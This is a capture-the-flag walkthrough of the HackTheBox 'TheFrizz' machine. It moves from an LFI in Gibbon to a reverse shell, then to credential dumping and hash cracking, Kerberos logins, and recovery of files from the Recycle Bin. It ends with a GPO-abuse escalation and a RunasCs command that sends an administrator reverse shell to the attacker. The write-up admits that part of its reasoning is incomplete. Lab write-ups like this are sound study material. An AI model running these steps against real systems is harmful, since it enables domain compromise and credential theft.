# TheFrizz Windows Medium Machine - HackTheBox

## Initial Access
You start by inspecting the website and discovering that the framework (Gibbon) version is vulnerable to **Local File Inclusion (LFI)**. Exploiting this vulnerability, you upload a PHP/CMD file and gain a reverse shell.

Once inside the machine, there isn’t much to explore initially. However, you can find MySQL credentials by running:
```bash
C:\xampp\mysql\bin\mysql.exe -u user -p pass -e 'command'
```
Since Windows doesn’t allow an interactive shell in this context, you must specify the MySQL query directly. This provides a dump of hashed credentials for a single user.

Use Hashcat with mode -m 1410 to crack the hash and obtain a new set of credentials.

To authenticate with the new credentials, use the getTGT.py script from Impacket. Export the newly created .ccache archive and synchronize your machine’s time with the domain controller using:

```bash
sudo ntpdate -u 10.10.11.60 && date
```

Then, log in via SSH with Kerberos authentication:

```bash
ssh -o GSSAPIAuthentication=yes user@frizz.htb
```

Now you have the user f.frizzle

After gaining access, you’ll find some unusual .7z files in the current user’s Recycle Bin. Since you can’t cd into the Recycle Bin directly, use an alternative method:

```powershell
> Push-Location 'C:\$Recycle.Bin'
```
To retrieve the files, use scp or set up an NGINX server capable of receiving PUT requests. Here’s an example scp command:

From your attacker:
```bash
scp -o GSSAPIAuthentication=yes f.frizzle@10.10.11.60:"C:/\$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/\$IE2XMEG.7z" weird.zip
```
Analyzing the .7z Files you will see of one of them is not 7z (7z says it). Cat it or use xxd and it print a backup directory from a tool called WAPT.

So now One of the .7z files contains a backup directory from WAPT. Use the following command to filter out non-ASCII characters:

```bash
cat weird.7z -A | tr -cd '\000-\177'
```


Going through the WAPT backup, you’ll find a Base64-encoded password in the settings file wapt/conf/waptserver.ini:

After decoding the password, you can brute-force the Active Directory (AD) users. But the box creator left a hint in the decoded password to guide you.

Obtain another Kerberos ticket for the new user and log in using the same method as before.


WARN: I need to understand it further.
Privilege Escalation to Root
From the new user, privilege escalation to root is straightforward. Running whoami /all reveals that you are part of the GPO Managers group. Research GPO abuse techniques for further exploitation.

Using SharpGPOAbuse
Create a new Group Policy Object (GPO):

```Powershell
# get root
> New-GPO -Name "doesnotmatter"
#add newlink to domain controllers
> New-GPLink -Name "doesnotmatter" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
#add m.schoolbus to localadmin group
> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName doesnotmatter
#force group policy update
> gpupdate /force
#send yourself a revshell with admin rights:
> .\RunasC.exe "M.SchoolBus" '!suBcig@MehTed!R' powershell.exe -r IP:9001
```
